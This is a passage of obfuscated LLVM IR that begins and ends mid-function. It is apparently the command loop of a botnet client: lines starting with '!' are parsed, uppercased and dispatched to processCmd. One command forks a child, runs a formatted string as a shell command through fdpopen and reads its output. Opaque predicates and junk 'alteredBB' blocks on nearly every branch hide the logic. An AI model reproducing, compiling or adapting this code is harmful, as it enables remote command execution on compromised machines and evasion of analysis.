  %408 = getelementptr inbounds i32, i32* %405, i64 %407
  store i32 %404, i32* %408, align 4
  br label %409

; <label>:409:                                    ; preds = %399
  %410 = load i32, i32* @x.97
  %411 = load i32, i32* @y.98
  %412 = sub i32 %410, 1
  %413 = mul i32 %410, %412
  %414 = urem i32 %413, 2
  %415 = icmp eq i32 %414, 0
  %416 = icmp slt i32 %411, 10
  %417 = or i1 %415, %416
  br i1 %417, label %originalBB87, label %originalBB87alteredBB

originalBB87:                                     ; preds = %originalBB87alteredBB, %409
  %418 = load i32, i32* %23, align 4
  %419 = add i32 %418, 1
  store i32 %419, i32* %23, align 4
  %420 = load i32, i32* @x.97
  %421 = load i32, i32* @y.98
  %422 = sub i32 %420, 1
  %423 = mul i32 %420, %422
  %424 = urem i32 %423, 2
  %425 = icmp eq i32 %424, 0
  %426 = icmp slt i32 %421, 10
  %427 = or i1 %425, %426
  br i1 %427, label %originalBBpart296, label %originalBB87alteredBB

originalBBpart296:                                ; preds = %originalBB87
  br label %378

; <label>:428:                                    ; preds = %originalBBpart285
  %429 = load i32*, i32** @pids, align 8
  %430 = bitcast i32* %429 to i8*
  call void @free(i8* %430) #2
  %431 = load i32*, i32** %22, align 8
  store i32* %431, i32** @pids, align 8
  br label %432

; <label>:432:                                    ; preds = %428, %303
  br label %433

; <label>:433:                                    ; preds = %432
  %434 = load i32, i32* %21, align 4
  %435 = add nsw i32 %434, 1
  store i32 %435, i32* %21, align 4
  br label %282

; <label>:436:                                    ; preds = %originalBBpart231
  %437 = load i32, i32* %20, align 4
  %438 = sext i32 %437 to i64
  %439 = getelementptr inbounds [4096 x i8], [4096 x i8]* %19, i64 0, i64 %438
  store i8 0, i8* %439, align 1
  %440 = getelementptr inbounds [4096 x i8], [4096 x i8]* %19, i32 0, i32 0
  call void @trim(i8* %440)
  %441 = getelementptr inbounds [4096 x i8], [4096 x i8]* %19, i32 0, i32 0
  %442 = call i8* @strstr(i8* %441, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.395, i32 0, i32 0)) #10
  %443 = getelementptr inbounds [4096 x i8], [4096 x i8]* %19, i32 0, i32 0
  %444 = icmp eq i8* %442, %443
  br i1 %444, label %445, label %446

; <label>:445:                                    ; preds = %436
  br label %276

; <label>:446:                                    ; preds = %436
  %447 = load i32, i32* @x.97
  %448 = load i32, i32* @y.98
  %449 = sub i32 %447, 1
  %450 = mul i32 %447, %449
  %451 = urem i32 %450, 2
  %452 = icmp eq i32 %451, 0
  %453 = icmp slt i32 %448, 10
  %454 = or i1 %452, %453
  br i1 %454, label %originalBB98, label %originalBB98alteredBB

originalBB98:                                     ; preds = %originalBB98alteredBB, %446
  %455 = getelementptr inbounds [4096 x i8], [4096 x i8]* %19, i32 0, i32 0
  %456 = call i8* @strstr(i8* %455, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.418, i32 0, i32 0)) #10
  %457 = getelementptr inbounds [4096 x i8], [4096 x i8]* %19, i32 0, i32 0
  %458 = icmp eq i8* %456, %457
  %459 = load i32, i32* @x.97
  %460 = load i32, i32* @y.98
  %461 = sub i32 %459, 1
  %462 = mul i32 %459, %461
  %463 = urem i32 %462, 2
  %464 = icmp eq i32 %463, 0
  %465 = icmp slt i32 %460, 10
  %466 = or i1 %464, %465
  br i1 %466, label %originalBBpart2100, label %originalBB98alteredBB

originalBBpart2100:                               ; preds = %originalBB98
  br i1 %458, label %467, label %491

; <label>:467:                                    ; preds = %originalBBpart2100
  %468 = load i32, i32* %10, align 4
  %469 = add nsw i32 %468, 1
  store i32 %469, i32* %10, align 4
  %470 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.419, i32 0, i32 0))
  %471 = load i32, i32* %10, align 4
  %472 = icmp sgt i32 %471, 20
  br i1 %472, label %473, label %490

; <label>:473:                                    ; preds = %467
  %474 = load i32, i32* @x.97
  %475 = load i32, i32* @y.98
  %476 = sub i32 %474, 1
  %477 = mul i32 %474, %476
  %478 = urem i32 %477, 2
  %479 = icmp eq i32 %478, 0
  %480 = icmp slt i32 %475, 10
  %481 = or i1 %479, %480
  br i1 %481, label %originalBB102, label %originalBB102alteredBB

originalBB102:                                    ; preds = %originalBB102alteredBB, %473
  call void @exit(i32 0) #14
  %482 = load i32, i32* @x.97
  %483 = load i32, i32* @y.98
  %484 = sub i32 %482, 1
  %485 = mul i32 %482, %484
  %486 = urem i32 %485, 2
  %487 = icmp eq i32 %486, 0
  %488 = icmp slt i32 %483, 10
  %489 = or i1 %487, %488
  br i1 %489, label %originalBBpart2104, label %originalBB102alteredBB

originalBBpart2104:                               ; preds = %originalBB102
  unreachable

; <label>:490:                                    ; preds = %467
  br label %853

; <label>:491:                                    ; preds = %originalBBpart2100
  %492 = getelementptr inbounds [4096 x i8], [4096 x i8]* %19, i32 0, i32 0
  store i8* %492, i8** %24, align 8
  %493 = load i8*, i8** %24, align 8
  %494 = load i8, i8* %493, align 1
  %495 = zext i8 %494 to i32
  %496 = icmp eq i32 %495, 33
  br i1 %496, label %497, label %852

; <label>:497:                                    ; preds = %491
  %498 = load i8*, i8** %24, align 8
  %499 = getelementptr inbounds i8, i8* %498, i64 1
  store i8* %499, i8** %25, align 8
  br label %500

; <label>:500:                                    ; preds = %528, %497
  %501 = load i32, i32* @x.97
  %502 = load i32, i32* @y.98
  %503 = sub i32 %501, 1
  %504 = mul i32 %501, %503
  %505 = urem i32 %504, 2
  %506 = icmp eq i32 %505, 0
  %507 = icmp slt i32 %502, 10
  %508 = or i1 %506, %507
  br i1 %508, label %originalBB106, label %originalBB106alteredBB

originalBB106:                                    ; preds = %originalBB106alteredBB, %500
  %509 = load i8*, i8** %25, align 8
  %510 = load i8, i8* %509, align 1
  %511 = zext i8 %510 to i32
  %512 = icmp ne i32 %511, 32
  %513 = load i32, i32* @x.97
  %514 = load i32, i32* @y.98
  %515 = sub i32 %513, 1
  %516 = mul i32 %513, %515
  %517 = urem i32 %516, 2
  %518 = icmp eq i32 %517, 0
  %519 = icmp slt i32 %514, 10
  %520 = or i1 %518, %519
  br i1 %520, label %originalBBpart2108, label %originalBB106alteredBB

originalBBpart2108:                               ; preds = %originalBB106
  br i1 %512, label %521, label %526

; <label>:521:                                    ; preds = %originalBBpart2108
  %522 = load i8*, i8** %25, align 8
  %523 = load i8, i8* %522, align 1
  %524 = zext i8 %523 to i32
  %525 = icmp ne i32 %524, 0
  br label %526

; <label>:526:                                    ; preds = %521, %originalBBpart2108
  %527 = phi i1 [ false, %originalBBpart2108 ], [ %525, %521 ]
  br i1 %527, label %528, label %531

; <label>:528:                                    ; preds = %526
  %529 = load i8*, i8** %25, align 8
  %530 = getelementptr inbounds i8, i8* %529, i32 1
  store i8* %530, i8** %25, align 8
  br label %500

; <label>:531:                                    ; preds = %526
  %532 = load i8*, i8** %25, align 8
  %533 = load i8, i8* %532, align 1
  %534 = zext i8 %533 to i32
  %535 = icmp eq i32 %534, 0
  br i1 %535, label %536, label %537

; <label>:536:                                    ; preds = %531
  br label %276

; <label>:537:                                    ; preds = %531
  %538 = load i8*, i8** %25, align 8
  store i8 0, i8* %538, align 1
  %539 = load i8*, i8** %24, align 8
  %540 = getelementptr inbounds i8, i8* %539, i64 1
  store i8* %540, i8** %25, align 8
  %541 = load i8*, i8** %24, align 8
  %542 = load i8*, i8** %25, align 8
  %543 = call i64 @strlen(i8* %542) #10
  %544 = getelementptr inbounds i8, i8* %541, i64 %543
  %545 = getelementptr inbounds i8, i8* %544, i64 2
  store i8* %545, i8** %24, align 8
  br label %546

; <label>:546:                                    ; preds = %582, %537
  %547 = load i8*, i8** %24, align 8
  %548 = load i8*, i8** %24, align 8
  %549 = call i64 @strlen(i8* %548) #10
  %550 = sub i64 %549, 1
  %551 = getelementptr inbounds i8, i8* %547, i64 %550
  %552 = load i8, i8* %551, align 1
  %553 = zext i8 %552 to i32
  %554 = icmp eq i32 %553, 10
  br i1 %554, label %564, label %555

; <label>:555:                                    ; preds = %546
  %556 = load i8*, i8** %24, align 8
  %557 = load i8*, i8** %24, align 8
  %558 = call i64 @strlen(i8* %557) #10
  %559 = sub i64 %558, 1
  %560 = getelementptr inbounds i8, i8* %556, i64 %559
  %561 = load i8, i8* %560, align 1
  %562 = zext i8 %561 to i32
  %563 = icmp eq i32 %562, 13
  br label %564

; <label>:564:                                    ; preds = %555, %546
  %565 = phi i1 [ true, %546 ], [ %563, %555 ]
  %566 = load i32, i32* @x.97
  %567 = load i32, i32* @y.98
  %568 = sub i32 %566, 1
  %569 = mul i32 %566, %568
  %570 = urem i32 %569, 2
  %571 = icmp eq i32 %570, 0
  %572 = icmp slt i32 %567, 10
  %573 = or i1 %571, %572
  br i1 %573, label %originalBB110, label %originalBB110alteredBB

originalBB110:                                    ; preds = %originalBB110alteredBB, %564
  %574 = load i32, i32* @x.97
  %575 = load i32, i32* @y.98
  %576 = sub i32 %574, 1
  %577 = mul i32 %574, %576
  %578 = urem i32 %577, 2
  %579 = icmp eq i32 %578, 0
  %580 = icmp slt i32 %575, 10
  %581 = or i1 %579, %580
  br i1 %581, label %originalBBpart2112, label %originalBB110alteredBB

originalBBpart2112:                               ; preds = %originalBB110
  br i1 %565, label %582, label %588

; <label>:582:                                    ; preds = %originalBBpart2112
  %583 = load i8*, i8** %24, align 8
  %584 = load i8*, i8** %24, align 8
  %585 = call i64 @strlen(i8* %584) #10
  %586 = sub i64 %585, 1
  %587 = getelementptr inbounds i8, i8* %583, i64 %586
  store i8 0, i8* %587, align 1
  br label %546

; <label>:588:                                    ; preds = %originalBBpart2112
  %589 = load i8*, i8** %24, align 8
  store i8* %589, i8** %26, align 8
  br label %590

; <label>:590:                                    ; preds = %634, %588
  %591 = load i32, i32* @x.97
  %592 = load i32, i32* @y.98
  %593 = sub i32 %591, 1
  %594 = mul i32 %591, %593
  %595 = urem i32 %594, 2
  %596 = icmp eq i32 %595, 0
  %597 = icmp slt i32 %592, 10
  %598 = or i1 %596, %597
  br i1 %598, label %originalBB114, label %originalBB114alteredBB

originalBB114:                                    ; preds = %originalBB114alteredBB, %590
  %599 = load i8*, i8** %24, align 8
  %600 = load i8, i8* %599, align 1
  %601 = zext i8 %600 to i32
  %602 = icmp ne i32 %601, 32
  %603 = load i32, i32* @x.97
  %604 = load i32, i32* @y.98
  %605 = sub i32 %603, 1
  %606 = mul i32 %603, %605
  %607 = urem i32 %606, 2
  %608 = icmp eq i32 %607, 0
  %609 = icmp slt i32 %604, 10
  %610 = or i1 %608, %609
  br i1 %610, label %originalBBpart2116, label %originalBB114alteredBB

originalBBpart2116:                               ; preds = %originalBB114
  br i1 %602, label %611, label %632

; <label>:611:                                    ; preds = %originalBBpart2116
  %612 = load i32, i32* @x.97
  %613 = load i32, i32* @y.98
  %614 = sub i32 %612, 1
  %615 = mul i32 %612, %614
  %616 = urem i32 %615, 2
  %617 = icmp eq i32 %616, 0
  %618 = icmp slt i32 %613, 10
  %619 = or i1 %617, %618
  br i1 %619, label %originalBB118, label %originalBB118alteredBB

originalBB118:                                    ; preds = %originalBB118alteredBB, %611
  %620 = load i8*, i8** %24, align 8
  %621 = load i8, i8* %620, align 1
  %622 = zext i8 %621 to i32
  %623 = icmp ne i32 %622, 0
  %624 = load i32, i32* @x.97
  %625 = load i32, i32* @y.98
  %626 = sub i32 %624, 1
  %627 = mul i32 %624, %626
  %628 = urem i32 %627, 2
  %629 = icmp eq i32 %628, 0
  %630 = icmp slt i32 %625, 10
  %631 = or i1 %629, %630
  br i1 %631, label %originalBBpart2120, label %originalBB118alteredBB

originalBBpart2120:                               ; preds = %originalBB118
  br label %632

; <label>:632:                                    ; preds = %originalBBpart2120, %originalBBpart2116
  %633 = phi i1 [ false, %originalBBpart2116 ], [ %623, %originalBBpart2120 ]
  br i1 %633, label %634, label %637

; <label>:634:                                    ; preds = %632
  %635 = load i8*, i8** %24, align 8
  %636 = getelementptr inbounds i8, i8* %635, i32 1
  store i8* %636, i8** %24, align 8
  br label %590

; <label>:637:                                    ; preds = %632
  %638 = load i8*, i8** %24, align 8
  store i8 0, i8* %638, align 1
  %639 = load i8*, i8** %24, align 8
  %640 = getelementptr inbounds i8, i8* %639, i32 1
  store i8* %640, i8** %24, align 8
  %641 = load i8*, i8** %26, align 8
  store i8* %641, i8** %27, align 8
  br label %642

; <label>:642:                                    ; preds = %646, %637
  %643 = load i8*, i8** %27, align 8
  %644 = load i8, i8* %643, align 1
  %645 = icmp ne i8 %644, 0
  br i1 %645, label %646, label %655

; <label>:646:                                    ; preds = %642
  %647 = load i8*, i8** %27, align 8
  %648 = load i8, i8* %647, align 1
  %649 = zext i8 %648 to i32
  %650 = call i32 @toupper(i32 %649) #10
  %651 = trunc i32 %650 to i8
  %652 = load i8*, i8** %27, align 8
  store i8 %651, i8* %652, align 1
  %653 = load i8*, i8** %27, align 8
  %654 = getelementptr inbounds i8, i8* %653, i32 1
  store i8* %654, i8** %27, align 8
  br label %642

; <label>:655:                                    ; preds = %642
  %656 = load i32, i32* @x.97
  %657 = load i32, i32* @y.98
  %658 = sub i32 %656, 1
  %659 = mul i32 %656, %658
  %660 = urem i32 %659, 2
  %661 = icmp eq i32 %660, 0
  %662 = icmp slt i32 %657, 10
  %663 = or i1 %661, %662
  br i1 %663, label %originalBB122, label %originalBB122alteredBB

originalBB122:                                    ; preds = %originalBB122alteredBB, %655
  %664 = load i8*, i8** %26, align 8
  %665 = call i32 @strcmp(i8* %664, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.420, i32 0, i32 0)) #10
  %666 = icmp eq i32 %665, 0
  %667 = load i32, i32* @x.97
  %668 = load i32, i32* @y.98
  %669 = sub i32 %667, 1
  %670 = mul i32 %667, %669
  %671 = urem i32 %670, 2
  %672 = icmp eq i32 %671, 0
  %673 = icmp slt i32 %668, 10
  %674 = or i1 %672, %673
  br i1 %674, label %originalBBpart2124, label %originalBB122alteredBB

originalBBpart2124:                               ; preds = %originalBB122
  br i1 %666, label %675, label %714

; <label>:675:                                    ; preds = %originalBBpart2124
  %676 = call i32 @listFork()
  %677 = icmp ne i32 %676, 0
  br i1 %677, label %678, label %679

; <label>:678:                                    ; preds = %675
  br label %276

; <label>:679:                                    ; preds = %675
  %680 = getelementptr inbounds [1024 x i8], [1024 x i8]* %28, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %680, i8 0, i64 1024, i32 16, i1 false)
  %681 = getelementptr inbounds [1024 x i8], [1024 x i8]* %28, i32 0, i32 0
  %682 = load i8*, i8** %24, align 8
  %683 = call i32 (i8*, i8*, ...) @szprintf(i8* %681, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.421, i32 0, i32 0), i8* %682)
  %684 = getelementptr inbounds [1024 x i8], [1024 x i8]* %28, i32 0, i32 0
  %685 = call i32 @fdpopen(i8* %684, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.411, i32 0, i32 0))
  store i32 %685, i32* %29, align 4
  br label %686

; <label>:686:                                    ; preds = %691, %679
  %687 = getelementptr inbounds [1024 x i8], [1024 x i8]* %28, i32 0, i32 0
  %688 = load i32, i32* %29, align 4
  %689 = call i8* @fdgets(i8* %687, i32 1024, i32 %688)
  %690 = icmp ne i8* %689, null
  br i1 %690, label %691, label %695

; <label>:691:                                    ; preds = %686
  %692 = getelementptr inbounds [1024 x i8], [1024 x i8]* %28, i32 0, i32 0
  call void @trim(i8* %692)
  %693 = getelementptr inbounds [1024 x i8], [1024 x i8]* %28, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %693, i8 0, i64 1024, i32 16, i1 false)
  %694 = call i32 @sleep(i32 1)
  br label %686

; <label>:695:                                    ; preds = %686
  %696 = load i32, i32* @x.97
  %697 = load i32, i32* @y.98
  %698 = sub i32 %696, 1
  %699 = mul i32 %696, %698
  %700 = urem i32 %699, 2
  %701 = icmp eq i32 %700, 0
  %702 = icmp slt i32 %697, 10
  %703 = or i1 %701, %702
  br i1 %703, label %originalBB126, label %originalBB126alteredBB

originalBB126:                                    ; preds = %originalBB126alteredBB, %695
  %704 = load i32, i32* %29, align 4
  %705 = call i32 @fdpclose(i32 %704)
  call void @exit(i32 0) #14
  %706 = load i32, i32* @x.97
  %707 = load i32, i32* @y.98
  %708 = sub i32 %706, 1
  %709 = mul i32 %706, %708
  %710 = urem i32 %709, 2
  %711 = icmp eq i32 %710, 0
  %712 = icmp slt i32 %707, 10
  %713 = or i1 %711, %712
  br i1 %713, label %originalBBpart2128, label %originalBB126alteredBB

originalBBpart2128:                               ; preds = %originalBB126
  unreachable

; <label>:714:                                    ; preds = %originalBBpart2124
  store i32 1, i32* %31, align 4
  %715 = load i8*, i8** %24, align 8
  %716 = call i8* @strtok(i8* %715, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.422, i32 0, i32 0)) #2
  store i8* %716, i8** %32, align 8
  %717 = load i8*, i8** %26, align 8
  %718 = getelementptr inbounds [10 x i8*], [10 x i8*]* %30, i64 0, i64 0
  store i8* %717, i8** %718, align 16
  br label %719

; <label>:719:                                    ; preds = %originalBBpart2136, %714
  %720 = load i8*, i8** %32, align 8
  %721 = icmp ne i8* %720, null
  br i1 %721, label %722, label %784

; <label>:722:                                    ; preds = %719
  %723 = load i32, i32* @x.97
  %724 = load i32, i32* @y.98
  %725 = sub i32 %723, 1
  %726 = mul i32 %723, %725
  %727 = urem i32 %726, 2
  %728 = icmp eq i32 %727, 0
  %729 = icmp slt i32 %724, 10
  %730 = or i1 %728, %729
  br i1 %730, label %originalBB130, label %originalBB130alteredBB

originalBB130:                                    ; preds = %originalBB130alteredBB, %722
  %731 = load i8*, i8** %32, align 8
  %732 = load i8, i8* %731, align 1
  %733 = zext i8 %732 to i32
  %734 = icmp ne i32 %733, 10
  %735 = load i32, i32* @x.97
  %736 = load i32, i32* @y.98
  %737 = sub i32 %735, 1
  %738 = mul i32 %735, %737
  %739 = urem i32 %738, 2
  %740 = icmp eq i32 %739, 0
  %741 = icmp slt i32 %736, 10
  %742 = or i1 %740, %741
  br i1 %742, label %originalBBpart2132, label %originalBB130alteredBB

originalBBpart2132:                               ; preds = %originalBB130
  br i1 %734, label %743, label %766

; <label>:743:                                    ; preds = %originalBBpart2132
  %744 = load i8*, i8** %32, align 8
  %745 = call i64 @strlen(i8* %744) #10
  %746 = add i64 %745, 1
  %747 = call noalias i8* @malloc(i64 %746) #2
  %748 = load i32, i32* %31, align 4
  %749 = sext i32 %748 to i64
  %750 = getelementptr inbounds [10 x i8*], [10 x i8*]* %30, i64 0, i64 %749
  store i8* %747, i8** %750, align 8
  %751 = load i32, i32* %31, align 4
  %752 = sext i32 %751 to i64
  %753 = getelementptr inbounds [10 x i8*], [10 x i8*]* %30, i64 0, i64 %752
  %754 = load i8*, i8** %753, align 8
  %755 = load i8*, i8** %32, align 8
  %756 = call i64 @strlen(i8* %755) #10
  %757 = add i64 %756, 1
  call void @llvm.memset.p0i8.i64(i8* %754, i8 0, i64 %757, i32 1, i1 false)
  %758 = load i32, i32* %31, align 4
  %759 = sext i32 %758 to i64
  %760 = getelementptr inbounds [10 x i8*], [10 x i8*]* %30, i64 0, i64 %759
  %761 = load i8*, i8** %760, align 8
  %762 = load i8*, i8** %32, align 8
  %763 = call i8* @strcpy(i8* %761, i8* %762) #2
  %764 = load i32, i32* %31, align 4
  %765 = add nsw i32 %764, 1
  store i32 %765, i32* %31, align 4
  br label %766

; <label>:766:                                    ; preds = %743, %originalBBpart2132
  %767 = load i32, i32* @x.97
  %768 = load i32, i32* @y.98
  %769 = sub i32 %767, 1
  %770 = mul i32 %767, %769
  %771 = urem i32 %770, 2
  %772 = icmp eq i32 %771, 0
  %773 = icmp slt i32 %768, 10
  %774 = or i1 %772, %773
  br i1 %774, label %originalBB134, label %originalBB134alteredBB

originalBB134:                                    ; preds = %originalBB134alteredBB, %766
  %775 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.422, i32 0, i32 0)) #2
  store i8* %775, i8** %32, align 8
  %776 = load i32, i32* @x.97
  %777 = load i32, i32* @y.98
  %778 = sub i32 %776, 1
  %779 = mul i32 %776, %778
  %780 = urem i32 %779, 2
  %781 = icmp eq i32 %780, 0
  %782 = icmp slt i32 %777, 10
  %783 = or i1 %781, %782
  br i1 %783, label %originalBBpart2136, label %originalBB134alteredBB

originalBBpart2136:                               ; preds = %originalBB134
  br label %719

; <label>:784:                                    ; preds = %719
  %785 = load i32, i32* %31, align 4
  %786 = getelementptr inbounds [10 x i8*], [10 x i8*]* %30, i32 0, i32 0
  call void @processCmd(i32 %785, i8** %786)
  %787 = load i32, i32* %31, align 4
  %788 = icmp sgt i32 %787, 1
  br i1 %788, label %789, label %835

; <label>:789:                                    ; preds = %784
  store i32 1, i32* %33, align 4
  store i32 1, i32* %33, align 4
  br label %790

; <label>:790:                                    ; preds = %originalBBpart2149, %789
  %791 = load i32, i32* %33, align 4
  %792 = load i32, i32* %31, align 4
  %793 = icmp slt i32 %791, %792
  br i1 %793, label %794, label %818

; <label>:794:                                    ; preds = %790
  %795 = load i32, i32* %33, align 4
  %796 = sext i32 %795 to i64
  %797 = getelementptr inbounds [10 x i8*], [10 x i8*]* %30, i64 0, i64 %796
  %798 = load i8*, i8** %797, align 8
  call void @free(i8* %798) #2
  br label %799

; <label>:799:                                    ; preds = %794
  %800 = load i32, i32* @x.97
  %801 = load i32, i32* @y.98
  %802 = sub i32 %800, 1
  %803 = mul i32 %800, %802
  %804 = urem i32 %803, 2
  %805 = icmp eq i32 %804, 0
  %806 = icmp slt i32 %801, 10
  %807 = or i1 %805, %806
  br i1 %807, label %originalBB138, label %originalBB138alteredBB

originalBB138:                                    ; preds = %originalBB138alteredBB, %799
  %808 = load i32, i32* %33, align 4
  %809 = add nsw i32 %808, 1
  store i32 %809, i32* %33, align 4
  %810 = load i32, i32* @x.97
  %811 = load i32, i32* @y.98
  %812 = sub i32 %810, 1
  %813 = mul i32 %810, %812
  %814 = urem i32 %813, 2
  %815 = icmp eq i32 %814, 0
  %816 = icmp slt i32 %811, 10
  %817 = or i1 %815, %816
  br i1 %817, label %originalBBpart2149, label %originalBB138alteredBB

originalBBpart2149:                               ; preds = %originalBB138
  br label %790

; <label>:818:                                    ; preds = %790
  %819 = load i32, i32* @x.97
  %820 = load i32, i32* @y.98
  %821 = sub i32 %819, 1
  %822 = mul i32 %819, %821
  %823 = urem i32 %822, 2
  %824 = icmp eq i32 %823, 0
  %825 = icmp slt i32 %820, 10
  %826 = or i1 %824, %825
  br i1 %826, label %originalBB151, label %originalBB151alteredBB

originalBB151:                                    ; preds = %originalBB151alteredBB, %818
  %827 = load i32, i32* @x.97
  %828 = load i32, i32* @y.98
  %829 = sub i32 %827, 1
  %830 = mul i32 %827, %829
  %831 = urem i32 %830, 2
  %832 = icmp eq i32 %831, 0
  %833 = icmp slt i32 %828, 10
  %834 = or i1 %832, %833
  br i1 %834, label %originalBBpart2153, label %originalBB151alteredBB

originalBBpart2153:                               ; preds = %originalBB151
  br label %835

; <label>:835:                                    ; preds = %originalBBpart2153, %784
  %836 = load i32, i32* @x.97
  %837 = load i32, i32* @y.98
  %838 = sub i32 %836, 1
  %839 = mul i32 %836, %838
  %840 = urem i32 %839, 2
  %841 = icmp eq i32 %840, 0
  %842 = icmp slt i32 %837, 10
  %843 = or i1 %841, %842
  br i1 %843, label %originalBB155, label %originalBB155alteredBB

originalBB155:                                    ; preds = %originalBB155alteredBB, %835
  %844 = load i32, i32* @x.97
  %845 = load i32, i32* @y.98
  %846 = sub i32 %844, 1
  %847 = mul i32 %844, %846
  %848 = urem i32 %847, 2
  %849 = icmp eq i32 %848, 0
  %850 = icmp slt i32 %845, 10
  %851 = or i1 %849, %850
  br i1 %851, label %originalBBpart2157, label %originalBB155alteredBB

originalBBpart2157:                               ; preds = %originalBB155
  br label %852

; <label>:852:                                    ; preds = %originalBBpart2157, %491
  br label %276

; <label>:853:                                    ; preds = %490, %276
  br label %265
                                                  ; No predecessors!
  %855 = load i32, i32* @x.97
  %856 = load i32, i32* @y.98
  %857 = sub i32 %855, 1
  %858 = mul i32 %855, %857
  %859 = urem i32 %858, 2
  %860 = icmp eq i32 %859, 0
  %861 = icmp slt i32 %856, 10
  %862 = or i1 %860, %861
  br i1 %862, label %originalBB159, label %originalBB159alteredBB

originalBB159:                                    ; preds = %originalBB159alteredBB, %854
  %863 = load i32, i32* %3, align 4
  %864 = load i32, i32* @x.97
  %865 = load i32, i32* @y.98
  %866 = sub i32 %864, 1
  %867 = mul i32 %864, %866
  %868 = urem i32 %867, 2
  %869 = icmp eq i32 %868, 0
  %870 = icmp slt i32 %865, 10
  %871 = or i1 %869, %870
  br i1 %871, label %originalBBpart2161, label %originalBB159alteredBB

originalBBpart2161:                               ; preds = %originalBB159
  ret i32 %863

originalBBalteredBB:                              ; preds = %originalBB, %85
  %872 = load i32, i32* %16, align 4
  %_ = sub i32 0, %872
  %gen = add i32 %_, -1
  %_1 = sub i32 %872, -1
  %gen2 = mul i32 %_1, -1
  %_3 = sub i32 0, %872
  %gen4 = add i32 %_3, -1
  %_5 = shl i32 %872, -1
  %_6 = sub i32 0, %872
  %gen7 = add i32 %_6, -1
  %_8 = shl i32 %872, -1
  %873 = add nsw i32 %872, -1
  store i32 %873, i32* %16, align 4
  br label %originalBB

originalBB9alteredBB:                             ; preds = %originalBB9, %131
  %874 = load i32, i32* %17, align 4
  %875 = icmp eq i32 %874, 0
  br label %originalBB9

originalBB13alteredBB:                            ; preds = %originalBB13, %182
  %876 = call i32 @fork() #2
  store i32 %876, i32* %8, align 4
  %877 = icmp ne i32 %876, 0
  br label %originalBB13

originalBB17alteredBB:                            ; preds = %originalBB17, %201
  call void @exit(i32 0) #14
  br label %originalBB17

originalBB21alteredBB:                            ; preds = %originalBB21, %222
  %878 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.416, i32 0, i32 0))
  br label %originalBB21

originalBB25alteredBB:                            ; preds = %originalBB25, %242
  %879 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.416, i32 0, i32 0))
  br label %originalBB25

originalBB29alteredBB:                            ; preds = %originalBB29, %282
  %880 = load i32, i32* %21, align 4
  %881 = sext i32 %880 to i64
  %882 = load i64, i64* @numpids, align 8
  %883 = icmp ult i64 %881, %882
  br label %originalBB29

originalBB33alteredBB:                            ; preds = %originalBB33, %314
  %884 = load i32, i32* %23, align 4
  %885 = zext i32 %884 to i64
  %886 = load i64, i64* @numpids, align 8
  %887 = icmp ult i64 %885, %886
  br label %originalBB33

originalBB37alteredBB:                            ; preds = %originalBB37, %349
  %888 = load i32*, i32** @pids, align 8
  %889 = load i32, i32* %23, align 4
  %_38 = sub i32 0, %889
  %gen39 = add i32 %_38, 1
  %_40 = sub i32 %889, 1
  %gen41 = mul i32 %_40, 1
  %_42 = shl i32 %889, 1
  %_43 = sub i32 0, %889
  %gen44 = add i32 %_43, 1
  %_45 = sub i32 %889, 1
  %gen46 = mul i32 %_45, 1
  %_47 = sub i32 %889, 1
  %gen48 = mul i32 %_47, 1
  %_49 = shl i32 %889, 1
  %_50 = sub i32 %889, 1
  %gen51 = mul i32 %_50, 1
  %890 = sub i32 %889, 1
  %891 = zext i32 %890 to i64
  %892 = getelementptr inbounds i32, i32* %888, i64 %891
  store i32 0, i32* %892, align 4
  %893 = load i64, i64* @numpids, align 8
  %_52 = sub i64 0, %893
  %gen53 = add i64 %_52, -1
  %_54 = shl i64 %893, -1
  %_55 = sub i64 %893, -1
  %gen56 = mul i64 %_55, -1
  %_57 = sub i64 0, %893
  %gen58 = add i64 %_57, -1
  %_59 = sub i64 %893, -1
  %gen60 = mul i64 %_59, -1
  %894 = add i64 %893, -1
  store i64 %894, i64* @numpids, align 8
  %895 = load i64, i64* @numpids, align 8
  %_61 = shl i64 %895, 1
  %_62 = sub i64 0, %895
  %gen63 = add i64 %_62, 1
  %896 = add i64 %895, 1
  %_64 = sub i64 0, %896
  %gen65 = add i64 %_64, 4
  %_66 = sub i64 0, %896
  %gen67 = add i64 %_66, 4
  %_68 = sub i64 0, %896
  %gen69 = add i64 %_68, 4
  %_70 = sub i64 %896, 4
  %gen71 = mul i64 %_70, 4
  %_72 = sub i64 0, %896
  %gen73 = add i64 %_72, 4
  %_74 = sub i64 %896, 4
  %gen75 = mul i64 %_74, 4
  %_76 = sub i64 %896, 4
  %gen77 = mul i64 %_76, 4
  %_78 = sub i64 %896, 4
  %gen79 = mul i64 %_78, 4
  %897 = mul i64 %896, 4
  %898 = call noalias i8* @malloc(i64 %897) #2
  %899 = bitcast i8* %898 to i32*
  store i32* %899, i32** %22, align 8
  store i32 0, i32* %23, align 4
  br label %originalBB37

originalBB83alteredBB:                            ; preds = %originalBB83, %378
  %900 = load i32, i32* %23, align 4
  %901 = zext i32 %900 to i64
  %902 = load i64, i64* @numpids, align 8
  %903 = icmp ult i64 %901, %902
  br label %originalBB83

originalBB87alteredBB:                            ; preds = %originalBB87, %409
  %904 = load i32, i32* %23, align 4
  %_88 = sub i32 %904, 1
  %gen89 = mul i32 %_88, 1
  %_90 = shl i32 %904, 1
  %_91 = shl i32 %904, 1
  %_92 = shl i32 %904, 1
  %_93 = sub i32 0, %904
  %gen94 = add i32 %_93, 1
  %905 = add i32 %904, 1
  store i32 %905, i32* %23, align 4
  br label %originalBB87

originalBB98alteredBB:                            ; preds = %originalBB98, %446
  %906 = getelementptr inbounds [4096 x i8], [4096 x i8]* %19, i32 0, i32 0
  %907 = call i8* @strstr(i8* %906, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.418, i32 0, i32 0)) #10
